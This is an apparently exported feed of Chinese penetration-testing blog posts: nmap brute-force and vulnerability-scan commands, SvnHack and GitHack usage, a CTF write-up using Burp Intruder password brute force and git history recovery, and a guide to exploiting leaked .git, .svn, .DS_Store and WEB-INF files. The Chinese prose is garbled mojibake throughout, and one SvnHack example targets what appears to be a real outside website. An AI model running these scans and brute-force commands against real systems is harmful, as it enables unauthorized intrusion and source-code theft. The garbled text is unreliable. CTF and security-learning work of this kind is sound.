1nmap 192.168.0.100 -p 21,22,23,80 å¯¹ç›®æ ‡åœ°å€è¿›è¡Œè·¯ç”±è·Ÿè¸ª 1nmap -traceroute 192.168.0.105 æ¢æµ‹é˜²ç«å¢™çŠ¶æ€ 1nmap -sF -T4 192.168.0.105 åˆ©ç”¨FINæ‰«æï¼Œæ”¶åˆ°RSTè¯´æ˜è¯¥ç«¯å£å…³é—­é˜²ç«å¢™ è„šæœ¬ä½¿ç”¨ è¿›è¡Œå¼±å£ä»¤æ¢æµ‹ é‰´æƒ 1nmap --script=auth 192.168.0.105 çˆ†ç ´ å¯å¯¹æ•°æ®åº“ã€SMBã€SNMPç­‰è¿›è¡Œç®€å•å¯†ç çš„æš´åŠ›çŒœè§£ 1nmap --script=brute 192.168.0.105 smbç ´è§£ï¼š 123456# è„šæœ¬nmap --script=smb-brute.nse IP# å­—å…¸nmap --script=smb-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd ip# æ¼æ´nmap --script=smb-check-vulns.nse --script-args=unsafe=1 ip mysqlæ‰«æï¼š 1234# rootç©ºå£ä»¤nmap -p3306 --script=mysql-empty-password.nse ip# åˆ—å‡ºmysqlç”¨æˆ·nmap -p3306 --script=mysql-users.nse --script-args=mysqluser=root ip Oracleæ‰«æï¼š 12# sid æ‰«ænmap --script=oracle-sid-brute -p 1521-1560 ip æ¼æ´æ‰«æ æ£€æŸ¥ç›®æ ‡ä¸»æœºæˆ–ç½‘æ®µæ˜¯å¦å­˜åœ¨å¸¸è§çš„æ¼æ´ 1nmap --script=vuln 192.168.0.105 åº”ç”¨æœåŠ¡ nmapå…·å¤‡å¾ˆå¤šå¸¸è§åº”ç”¨æœåŠ¡çš„æ‰«æè„šæœ¬ï¼Œä¾‹å¦‚VNCæœåŠ¡ã€MySQLæœåŠ¡ã€TelnetæœåŠ¡ã€RsyncæœåŠ¡ç­‰ï¼Œä»¥VNCæœåŠ¡ä¸ºä¾‹ 1nmap --script=realvnc-auth-bypass 192.168.0.105 æ¢æµ‹å±€åŸŸç½‘å†…æ›´å¤šæœåŠ¡çš„å¼€å¯æƒ…å†µ 1nmap -n -p 445 --script=broadcast 192.168.0.105 whoisè§£æ åˆ©ç”¨ç¬¬ä¸‰æ–¹çš„æ•°æ®åº“æˆ–èµ„æºæŸ¥è¯¢ç›®æ ‡åœ°å€çš„ä¿¡æ¯ï¼Œä¾‹å¦‚è¿›è¡Œwhoisè§£æ 1nmap -script external baidu.com â€‹ å¸¸è§ç«¯å£å· ç«¯å£å· åè®®&#x2F;ç”¨é€” 20 FTP æ•°æ®ç«¯å£ 21 FTPæ–‡ä»¶ä¼ è¾“åè®®ç«¯å£ 22 SSHæœåŠ¡ 23 Telnet æœåŠ¡ 25 ç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼ˆSMTPï¼‰ 53 åŸŸåæœåŠ¡ 67 DHCPã€åŠ¨æ€ä¸»æœºé…ç½®åè®® 80 http 88 Kerberos ç½‘ç»œéªŒè¯ç³»ç»Ÿ 110 POP3é‚®å±€åè®® 113 éªŒè¯å’Œèº«ä»½è¯†åˆ«åè®® 115 sftpï¼ŒSFTPå®‰å…¨æ–‡ä»¶ä¼ è¾“åè®® 443 https å®‰å…¨è¶…æ–‡æœ¬ä¼ è¾“åè®® 520 RIP è·¯ç”±ä¿¡æ¯åè®® 992 telnetsï¼Œé€šè¿‡å®‰å…¨å¥—æ¥å­—å±‚çš„ Telnet 995 pop3sï¼Œé€šè¿‡å®‰å…¨å¥—æ¥å­—å±‚çš„é‚®å±€åè®®ç‰ˆæœ¬3 1080 Socksä»£ç†æœåŠ¡ç«¯å£ 1755 å¾®è½¯åª’ä½“æœåŠ¡å™¨ï¼Œç®€ç§°MMS 1521 Oracle æ•°æ®åº“ 8080 Oracle XDBï¼ˆ XML æ•°æ®åº“ï¼‰ 3389 Windowsè¿œç¨‹æ¡Œé¢ 7001 WebLogic 8080 Tomcat 3306 MySQL æ•°æ®åº“æœåŠ¡ 445 IPCæœåŠ¡é»˜è®¤ç«¯å£ï¼Œåœ¨å±€åŸŸç½‘ä¸­è½»æ¾è®¿é—®å„ç§å…±äº«æ–‡ä»¶å¤¹æˆ–å…±äº«æ‰“å°æœºã€‚æ°¸æ’ä¹‹è“ å‚è€ƒæ–‡ç« https://blog.51cto.com/binghe001/5246901","categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"æ¸—é€æµ‹è¯•/ä¿¡æ¯æ”¶é›†","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"tags":[{"name":"nmap","slug":"nmap","permalink":"https://gryffinbit.top/tags/nmap/"}],"author":"Gryffinbit"},{"title":"svnhackåŸç†åŠåº”ç”¨","slug":"svnhackåŸç†åŠåº”ç”¨","date":"2022-08-24T18:16:12.000Z","updated":"2024-11-12T06:59:12.000Z","comments":true,"path":"2022/08/25/svnhackåŸç†åŠåº”ç”¨/","permalink":"https://gryffinbit.top/2022/08/25/svnhack%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/","excerpt":"","text":"ç¯å¢ƒé…ç½®Kali Linux 2021.3 ARM64 å®‰è£…é€‰æ‹©è‡ªå·±å–œæ¬¢çš„å®‰è£…è·¯å¾„ 1cd /root/Documents/Tools 1git clone https://github.com/callmefeifei/SvnHack æ³¨æ„pythonè¦ä½¿ç”¨python2ç‰ˆæœ¬çš„ 12cd SvnHackpython2 SvnHack.py -u http://trafficbonus.com/.svn/entries å‚æ•°123456# åˆ—å–æŒ‡å®šç›®å½•-d ç›®å½•å# è¯»å–æŒ‡å®šä»£ç -r index.php# ä¸‹è½½æ•´è´´--download å‚è€ƒæ–‡ç« https://www.cnblogs.com/Lmg66/p/13598803.html","categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"å·¥å…·","slug":"æ¸—é€æµ‹è¯•/å·¥å…·","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"svnhack","slug":"svnhack","permalink":"https://gryffinbit.top/tags/svnhack/"}],"author":"Gryffinbit"},{"title":"githackåŸç†åŠåº”ç”¨ï¼ˆç½‘é¼æ¯commenté¢˜ï¼‰","slug":"githackåŸç†åŠåº”ç”¨","date":"2022-08-24T18:14:34.000Z","updated":"2024-11-12T06:59:44.000Z","comments":true,"path":"2022/08/25/githackåŸç†åŠåº”ç”¨/","permalink":"https://gryffinbit.top/2022/08/25/githack%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/","excerpt":"","text":"ç¯å¢ƒé…ç½®Kali Linux 2021.3 ARM64 å®‰è£…é€‰æ‹©è‡ªå·±å–œæ¬¢çš„å®‰è£…è·¯å¾„ 1cd /root/Documents/Tools 1git clone https://github.com/BugScanTeam/GitHack æ³¨æ„pythonè¦ä½¿ç”¨python2ç‰ˆæœ¬çš„ 12cd GitHackpython2 GitHack.py http://challenge-11233494fe689bdd.sandbox.ctfhub.com:10080/.git ä¸€é“CTFç»ƒä¹ é¢˜ ç½‘é¼æ¯commentï¼Œbuuctfé¶åœºåœ°å€ï¼šhttps://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment éœ€è¦çˆ†ç ´ç™»é™† æ˜¯ä¸€ä¸ªå‘å¸–çš„ç½‘é¡µï¼Œéœ€è¦ç™»é™†ï¼Œæ‰å¯ä»¥é¡ºåˆ©å‘å¸– ä½¿ç”¨burpsuiteå¯¹ç™»é™†å¯†ç è¿›è¡Œçˆ†ç ´ã€‚è®¾ç½®ä»£ç†ï¼Œåˆ†åˆ«å¯¹æµè§ˆå™¨å’Œburpsuiteè¿›è¡Œè®¾ç½® æµè§ˆå™¨ä»£ç†ï¼š burpsuiteå¼€å¯ç›‘å¬ åœ¨ç™»å½•æ¡†é¡µé¢ï¼Œéšä¾¿è¾“å…¥ç”¨æˆ·å¯†ç ï¼Œburpsuiteä¼šæ‹¦æˆªæ•°æ®åŒ… åœ¨è¯¥ç•Œé¢ç©ºç™½å¤„å³é”®ï¼Œé€‰æ‹© send to intruder ï¼ˆinturderå¯ç”¨äºå¯¹å¯†ç è¿›è¡Œè‡ªåŠ¨åŒ–çˆ†ç ´ï¼‰ Intruderæ˜¯å¯å®šåˆ¶çš„ã€é«˜åº¦å¯é…çš„å·¥å…·ï¼Œå¸¸ç”¨äºå¯¹webåº”ç”¨ç¨‹åºè¿›è¡Œè‡ªåŠ¨åŒ–æ”»å‡»ï¼ŒåŸºæœ¬æµç¨‹ä¸ºè®¾ç½®ä»£ç†å¹¶å¼€å¯æ‹¦æˆªè¯·æ±‚ï¼Œå°†æ‹¦æˆªåˆ°çš„æ•°æ®åŒ…å‘é€åˆ°Intruderæ¨¡å—ï¼Œæ·»åŠ éœ€è¦æ”»å‡»çš„å‚æ•°ï¼Œè®¾ç½®å‚æ•°å­—å…¸ï¼Œå¼€å§‹æ”»å‡»ã€‚ ç‚¹å‡»intruderé¡µé¢ å°†è‡ªåŠ¨è®¾ç½®çš„positionï¼Œç‚¹å³è¾¹èœå•æ addä¸‹é¢çš„clearæ¸…é™¤æ‰ï¼Œç„¶ååœ¨è¯·æ±‚ä¸­çš„passwordï¼Œåœ¨zhangweiåé¢çš„ä½ç½®ç‚¹å‡»Addï¼Œè®¾ç½®æ”»å‡»ç±»å‹ä¸ºCluster bombï¼ˆå› ä¸ºåªéœ€è¦çˆ†ç ´åä¸‰ä½å°±å¯ä»¥ï¼‰ è®¾ç½®payloadsï¼Œé€‰æ‹©çˆ†ç ´æ–¹å¼ï¼ŒæŒ‡å®šçˆ†ç ´é•¿åº¦èŒƒå›´ï¼Œåªéœ€è¦ä¸‰ä½ ç‚¹å‡»start attackå¼€å§‹çˆ†ç ´ï¼Œä¸“ä¸šç‰ˆè®¾ç½®å¤šçº¿ç¨‹ã€‚2022å¹´çš„bpåœ¨èµ„æºæ±  resource pool ä¸­è®¾ç½®æœ€å¤§çº¿ç¨‹æ•° çˆ†ç ´æˆåŠŸï¼Œæ‰¾åˆ°é•¿åº¦ä¸åŒçš„é‚£ä¸ªLength&#x3D;2024ï¼ŒçŠ¶æ€ç æ˜¾ç¤ºçš„302ï¼Œä»£è¡¨é‡å®šå‘äº†ã€‚ ç™»é™†æˆåŠŸ f12æ§åˆ¶å°æœ‰æç¤ºï¼Œæ‰€ä»¥è·Ÿgitæœ‰å…³ ç›®å½•çˆ†ç ´ kali dirsearch 1dirsearch -u http://3daaffa8-f7e3-49bc-8a4d-f287334a2e82.node4.buuoj.cn:81 -t 120 -o /root/report.txt 1scp report.txt gryffinbit@10.211.55.2:/Users/gryffinbit ä¸Šä¼ åˆ°Macä¸Šï¼Œç”¨sublimeæ¯”è¾ƒæ–¹ä¾¿å¥½çœ‹ githack æ‰¾åˆ°äº†gitæ–‡ä»¶ä½¿ç”¨kaliï¼Œgithackï¼Œå°†gitä¸‹è½½åˆ°æœ¬åœ° 12cd Documents/Tools/GitHackpython2 GitHack.py http://3daaffa8-f7e3-49bc-8a4d-f287334a2e82.node4.buuoj.cn:81/.git æ‰¾åˆ°åˆšåˆšçš„æ–‡ä»¶ 1cd /root/Documents/Tools/GitHack/dist/3daaffa8-f7e3-49bc-8a4d-f287334a2e82.node4.buuoj.cn_81/.git Git æŸ¥çœ‹ 1git log --all ç‰ˆæœ¬å›é€€ å¯ä»¥çœ‹åˆ°gitæœ‰ä¸‰æ¬¡æäº¤ï¼Œå›é€€åˆ°æœ€åˆç‰ˆæœ¬ï¼Œè·å¾—æ·»åŠ çš„è¿™ä¸ªwrite_do.php 1git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c æŸ¥çœ‹write_do.php å¯åˆ¤æ–­å­˜åœ¨äºŒæ¬¡æ³¨å…¥ å‚è€ƒæ–‡ç« https://www.bilibili.com/read/cv8054287/ https://zhuanlan.zhihu.com/p/425190294","categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"å·¥å…·","slug":"æ¸—é€æµ‹è¯•/å·¥å…·","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"githack","slug":"githack","permalink":"https://gryffinbit.top/tags/githack/"}],"author":"Gryffinbit"},{"title":"ç›®å½•æ‰«æï¼šæ•æ„Ÿä¿¡æ¯ï¼Œä»¥åŠå¸¸è§çŠ¶æ€ç ","slug":"ç›®å½•æ‰«æï¼šæ•æ„Ÿä¿¡æ¯ï¼Œä»¥åŠå¸¸è§çŠ¶æ€ç ","date":"2022-08-24T14:50:16.000Z","updated":"2024-08-27T02:28:10.000Z","comments":true,"path":"2022/08/24/ç›®å½•æ‰«æï¼šæ•æ„Ÿä¿¡æ¯ï¼Œä»¥åŠå¸¸è§çŠ¶æ€ç /","permalink":"https://gryffinbit.top/2022/08/24/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%EF%BC%9A%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E7%8A%B6%E6%80%81%E7%A0%81/","excerpt":"","text":"å‰è¨€githackä½¿ç”¨è·³è½¬Blogï¼šhttps://gryffinbit.top/2022/08/24/githack%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/ svnhackä½¿ç”¨è·³è½¬Blogï¼šhttps://gryffinbit.top/2022/08/24/svnhack%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/ æ•æ„Ÿä¿¡æ¯robots.txtæ˜¯ä»€ä¹ˆï¼š robots.txtæ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ç½‘ç«™ç®¡ç†è€…å¯ä»¥å£°æ˜è¯¥ç½‘ç«™ä¸­ä¸æƒ³è¢«æœç´¢å¼•æ“è®¿é—®çš„éƒ¨åˆ†ï¼Œæˆ–è€…æŒ‡å®šæœç´¢å¼•æ“åªæ”¶å½•æŒ‡å®šçš„å†…å®¹ã€‚å½“ä¸€ä¸ªæœç´¢å¼•æ“ï¼ˆåˆç§°æœç´¢æœºå™¨äººæˆ–èœ˜è››ç¨‹åºï¼‰è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œå®ƒä¼šé¦–å…ˆæ£€æŸ¥è¯¥ç«™ç‚¹æ ¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨robots.txtï¼Œå¦‚æœå­˜åœ¨ï¼Œæœç´¢æœºå™¨äººå°±ä¼šæŒ‰ç…§è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹æ¥ç¡®å®šè®¿é—®çš„èŒƒå›´ï¼›å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆæœç´¢æœºå™¨äººå°±æ²¿ç€é“¾æ¥æŠ“å–ã€‚ ä½œç”¨ï¼š å¼•å¯¼æœç´¢å¼•æ“èœ˜è››æŠ“å–æŒ‡å®šæ ç›®æˆ–å†…å®¹ ç½‘ç«™æ”¹ç‰ˆæˆ–è€…URLé‡å†™ä¼˜åŒ–æ—¶å€™å±è”½å¯¹æœç´¢å¼•æ“çš„ä¸å‹å¥½çš„é“¾æ¥ å±è”½æ­»é“¾æ¥ã€404é”™è¯¯é¡µ å±è”½æ— å†…å®¹ã€æ— ä»·å€¼é¡µé¢ å±è”½é‡å¤é¡µé¢ï¼Œå¦‚è¯„è®ºé¡µã€æœç´¢ç»“æœé¡µ å¼•å¯¼èœ˜è››æŠ“å–ç½‘ç«™åœ°å›¾ crossdomain.xmlæ˜¯ä»€ä¹ˆ è·¨åŸŸï¼Œé¡¾åæ€ä¹‰å°±æ˜¯éœ€è¦çš„èµ„æºä¸åœ¨è‡ªå·±çš„åŸŸæœåŠ¡å™¨ä¸Šï¼Œéœ€è¦è®¿é—®å…¶ä»–åŸŸæœåŠ¡å™¨ã€‚è·¨åŸŸç­–ç•¥æ–‡ä»¶æ˜¯ä¸€ä¸ªxmlæ–‡æ¡£æ–‡ä»¶ï¼Œä¸»è¦æ˜¯ä¸ºwebå®¢æˆ·ç«¯(å¦‚Adobe Flash Playerç­‰)è®¾ç½®è·¨åŸŸå¤„ç†æ•°æ®çš„æƒé™ã€‚ ä½œç”¨ æ‰“ä¸ªæ¯”æ–¹è¯´ï¼Œå…¬å¸Aéƒ¨é—¨æœ‰ä¸€å°å…¬å…±çš„ç”µè„‘ï¼Œé‡Œé¢å­˜æ”¾ç€ä¸€äº›èµ„æ–™æ–‡ä»¶ï¼Œä¸“é—¨ä¾›Aéƒ¨é—¨å†…æˆå‘˜è‡ªå·±ä½¿ç”¨ï¼Œè¿™æ ·ï¼ŒAéƒ¨é—¨å†…çš„å‘˜å·¥å°±å¯ä»¥è®¿é—®è¯¥ç”µè„‘ï¼Œå…¶ä»–éƒ¨é—¨äººå‘˜åˆ™ä¸å…è®¸è®¿é—®ã€‚Aéƒ¨é—¨çš„å‘˜å·¥å¯ä»¥ä»»æ„è®¿é—®Aéƒ¨é—¨çš„å…¬å…±ç”µè„‘ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®Béƒ¨é—¨çš„å…¬å…±ç”µè„‘ã€‚æœ‰ä¸€å¤©ï¼ŒBéƒ¨é—¨é¢†å¯¼è§‰å¾—ä»–ä»¬çš„èµ„æ–™éå¸¸æœ‰ç”¨ï¼Œæƒ³è¦ä¸Aéƒ¨é—¨åˆ†äº«ï¼Œäºæ˜¯å°±ç»™Aéƒ¨é—¨ä¸€ä¸ªä»¤ç‰Œï¼Œè¿™æ ·Aéƒ¨é—¨çš„å‘˜å·¥ä¹Ÿå¯ä»¥è®¿é—®Béƒ¨é—¨çš„å…¬å…±ç”µè„‘äº†ã€‚Aéƒ¨é—¨å¯è®¿é—®Béƒ¨é—¨è®¾ç½®è®¿é—®æƒé™ï¼Œè¿™ä¸ªæƒé™è®¾ç½®å°±æ˜¯è·¨åŸŸç­–ç•¥æ–‡ä»¶crossdomain.xmlå­˜åœ¨çš„æ„ä¹‰ã€‚ sitemap.xmlæ˜¯ä»€ä¹ˆ Sitemap å¯æ–¹ä¾¿ç½‘ç«™ç®¡ç†å‘˜é€šçŸ¥æœç´¢å¼•æ“ä»–ä»¬ç½‘ç«™ä¸Šæœ‰å“ªäº›å¯ä¾›æŠ“å–çš„ç½‘é¡µã€‚æœ€ç®€å•çš„ Sitemap å½¢å¼ï¼Œå°±æ˜¯XML æ–‡ä»¶ ä½œç”¨ åœ¨å…¶ä¸­åˆ—å‡ºç½‘ç«™ä¸­çš„ç½‘å€ä»¥åŠå…³äºæ¯ä¸ªç½‘å€çš„å…¶ä»–å…ƒæ•°æ®ï¼ˆä¸Šæ¬¡æ›´æ–°çš„æ—¶é—´ã€æ›´æ”¹çš„é¢‘ç‡ä»¥åŠç›¸å¯¹äºç½‘ç«™ä¸Šå…¶ä»–ç½‘å€çš„é‡è¦ç¨‹åº¦ä¸ºä½•ç­‰ï¼‰ï¼Œä»¥ä¾¿æœç´¢å¼•æ“å¯ä»¥æ›´åŠ æ™ºèƒ½åœ°æŠ“å–ç½‘ç«™ã€‚ ä»¥ä¸‹æ˜¯ç”±äºç‰ˆæœ¬æ§åˆ¶å¯¼è‡´çš„æ–‡ä»¶æ³„éœ² .gitæºä»£ç æ³„éœ²æ˜¯ä»€ä¹ˆ åœ¨æ‰§è¡Œgit initåˆå§‹åŒ–ç›®å½•çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª.gitç›®å½•ï¼Œç”¨æ¥è®°å½•ä»£ç å˜æ›´è®°å½•ç­‰ã€‚å‘å¸ƒä»£ç çš„æ—¶å€™ï¼Œå¦‚æœæ²¡æœ‰æŠŠ.gitè¿™ä¸ªç›®å½•åˆ é™¤ï¼Œå°±ç›´æ¥å‘å¸ƒåˆ°äº†æœåŠ¡å™¨ä¸Šï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡å®ƒæ¥æ¢å¤æºä»£ç ã€‚ æ€ä¹ˆç”¨ åˆ©ç”¨å·¥å…·ï¼šGitHack é¡¹ç›®åœ°å€ï¼šhttps://github.com/BugScanTeam/GitHack .cvsæºä»£ç æ³„éœ²æ˜¯ä»€ä¹ˆ CSVæ˜¯ä¸€ä¸ªC&#x2F;Sç³»ç»Ÿï¼Œå¤šä¸ªå¼€å‘äººå‘˜é€šè¿‡ä¸­å¿ƒç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæ¥è®°å½•æ–‡ä»¶ç‰ˆæœ¬ï¼Œä»è€Œè¾¾åˆ°ä¿è¯æ–‡ä»¶åŒæ­¥çš„ç›®çš„ã€‚ ä½œç”¨ ä¸»è¦æ˜¯é’ˆå¯¹CVS&#x2F;Rootä»¥åŠCVS&#x2F;Entriesç›®å½•ï¼Œç›´æ¥å°±å¯ä»¥çœ‹åˆ°æ³„éœ²çš„ä¿¡æ¯ã€‚ è¿”å›æ ¹ä¿¡æ¯ï¼šhttp://www.example.com/CVS/Root è¿”å›æ‰€æœ‰æ–‡ä»¶çš„ç»“æ„ï¼šhttp://www.example.com/CVS/Entries æ€ä¹ˆç”¨ æ¼æ´åˆ©ç”¨å·¥å…·ï¼šdvcs-ripper é¡¹ç›®åœ°å€ï¼šhttps://github.com/kost/dvcs-ripper.git è¿è¡Œç¤ºä¾‹ï¼š 1rip-cvs.pl -v -u http://www.example.com/CVS .svnæºä»£ç æ³„éœ²æ˜¯ä»€ä¹ˆ SVNæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿã€‚åœ¨ä½¿ç”¨SVNç®¡ç†æœ¬åœ°ä»£ç è¿‡ç¨‹ä¸­ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåä¸º.svnçš„éšè—æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­åŒ…å«é‡è¦åœ°æ–¹æºä»£ç ä¿¡æ¯ã€‚ ä½œç”¨ ç½‘ç«™ç®¡ç†å‘˜åœ¨å‘å¸ƒä»£ç æ—¶ï¼Œæ²¡æœ‰ä½¿ç”¨â€˜å¯¼å‡ºâ€™åŠŸèƒ½ï¼Œè€Œæ˜¯ç›´æ¥å¤åˆ¶ä»£ç æ–‡ä»¶å¤¹åˆ°WEBæœåŠ¡å™¨ä¸Šï¼Œè¿™å°±ä½¿.svnéšè—æ–‡ä»¶å¤¹è¢«æš´éœ²åœ¨å¤–ç½‘ç¯å¢ƒï¼Œå¯ä»¥ä½¿ç”¨.svn&#x2F;entriesæ–‡ä»¶ï¼Œè·å–åˆ°æœåŠ¡å™¨æºç ã€‚ æ€ä¹ˆç”¨ Seay SVNæ¼æ´åˆ©ç”¨å·¥å…· SvnExploit é¡¹ç›®åœ°å€ï¼šhttps://github.com/admintony/svnExploit/ .hgæºä»£ç æ³„éœ²æ˜¯ä»€ä¹ˆ Mercurialæ˜¯ä¸€ç§è½»é‡çº§åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œä½¿ç”¨hg initçš„æ—¶å€™ä¼šç”Ÿæˆ.hgã€‚ æ€ä¹ˆç”¨ æ¼æ´åˆ©ç”¨å·¥å…·ï¼šdvcs-ripper é¡¹ç›®åœ°å€ï¼šhttps://github.com/kost/dvcs-ripper.git è¿è¡Œç¤ºä¾‹ï¼š 1rip-cvs.pl -v -u http://www.example.com/.hg/ .DS_storeæ–‡ä»¶æ³„éœ²æ˜¯ä»€ä¹ˆ .DS_storeæ˜¯Macä¸‹Finderç”¨æ¥ä¿å­˜å¦‚ä½•å±•ç¤º æ–‡ä»¶&#x2F;æ–‡ä»¶å¤¹ çš„æ•°æ®æ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶å¤¹ä¸‹å¯¹åº”ä¸€ä¸ªã€‚ ä½œç”¨ å¦‚æœå°†.DS_storeä¸Šä¼ éƒ¨ç½²åˆ°æœåŠ¡å™¨ï¼Œå¯èƒ½é€ æˆæ–‡ä»¶ç›®å½•ç»“æ„æ³„éœ²ï¼Œç‰¹åˆ«æ˜¯å¤‡ä»½æ–‡ä»¶ã€æºä»£ç æ–‡ä»¶ã€‚ æ€ä¹ˆç”¨ æ¼æ´åˆ©ç”¨å·¥å…·ï¼šds_store_exp é¡¹ç›®åœ°å€ï¼šhttps://github.com/lijiejie/ds_store_exp è¿è¡Œç¤ºä¾‹ï¼š 1ds_store_exp.py http://xxx.com/.DS_Store ç½‘ç«™å¤‡ä»½æ–‡ä»¶æ³„éœ²ç®¡ç†å‘˜å°†ç½‘ç«™æºä»£ç å¤‡ä»½åœ¨Webç›®å½•ä¸‹ï¼Œæ”»å‡»è€…é€šè¿‡çŒœè§£æ–‡ä»¶è·¯å¾„ï¼Œä¸‹è½½å¤‡ä»½æ–‡ä»¶ï¼Œå¯¼è‡´æºä»£ç æ³„éœ²ã€‚å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åç¼€ï¼š.rarã€.zipã€.7zã€.tar.gzã€.bakã€.txtã€.oldã€.temp SWPæ–‡ä»¶æ³„éœ²swpå³swapæ–‡ä»¶ï¼Œåœ¨ç¼–è¾‘æ–‡ä»¶æ—¶äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶ï¼Œå®ƒæ˜¯éšè—æ–‡ä»¶ï¼Œå¦‚æœç¨‹åºæ­£å¸¸é€€å‡ºï¼Œä¸´æ—¶æ–‡ä»¶è‡ªåŠ¨åˆ é™¤ï¼Œå¦‚æœæ„å¤–é€€å‡ºå°±ä¼šä¿ç•™ï¼Œæ–‡ä»¶åä¸º.filename.swpã€‚ WEB-INF&#x2F;web.xmlæ³„éœ²æ˜¯ä»€ä¹ˆ WEB-INFæ˜¯Javaçš„Webåº”ç”¨çš„å®‰å…¨ç›®å½• WEB-INFä¸»è¦åŒ…å«ä»¥ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š WEB-INF&#x2F;web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº†servletå’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶åŠå‘½åè§„åˆ™ WEB-INF&#x2F;database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶ WEB-INF&#x2F;classes&#x2F;ï¼šä¸€èˆ¬ç”¨æ¥å­˜æ”¾Javaç±»æ–‡ä»¶ï¼ˆ.classï¼‰ WEB-INF&#x2F;lib&#x2F;ï¼šç”¨æ¥å­˜æ”¾æ‰“åŒ…å¥½çš„åº“ï¼ˆ.jarï¼‰ WEB-INF&#x2F;src&#x2F;ï¼šç”¨æ¥å­˜æ”¾æºä»£ç  ä½œç”¨ å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚ é€šè¿‡æ‰¾åˆ° web.xml æ–‡ä»¶ï¼Œæ¨æ–­ class æ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥ä¸‹è½½ class æ–‡ä»¶ï¼Œå†é€šè¿‡åç¼–è¯‘ class æ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚ æ•æ„Ÿç›®å½•æ”¶é›†æ–¹å¼ç½‘é¡µä¸­å¯»æ‰¾ åœ¨robots.txtä¸­çœ‹èƒ½å¦å‘ç°æ•æ„Ÿç›®å½• F12æºä»£ç é“¾æ¥å¤„ é€šè¿‡æŸ¥çœ‹ä¸€äº›å›¾ç‰‡çš„å±æ€§è·¯å¾„ï¼Œè¿æ°”å¥½ä¼šå‘ç°å¾ˆå¤šéšè—çš„ç›®å½• ç»“åˆåŸŸå+ç›®å½•ï¼Œ ç”¨ç›®å½•æ‰«æå·¥å…·è¿›è¡Œæ‰«æ æ‰‹åŠ¨è¾“å…¥ä¸€äº›å¸¸è§çš„åå°ç®¡ç†åœ°å€è¿›è¡Œè®¿é—®ã€‚ å…¶ä»–ç«¯å£ä¸­å¯»æ‰¾æœ‰æ—¶å€™ç½‘ç«™çš„ä¸åŒç«¯å£ä¸­æœ‰ä¸€äº›ä¾¿æ˜¯ä¸“é—¨çš„åå°ç®¡ç†åœ°å€ã€‚æ ¹æ®ç»éªŒæ€»ç»“ï¼Œå¾ˆå¤šç½‘ç«™8080ã€8081ç«¯å£æ˜¯ç½‘ç«™çš„ç®¡ç†åœ°å€ã€‚ ä¾‹å¦‚ï¼šhttp://www.xxx.com:8080 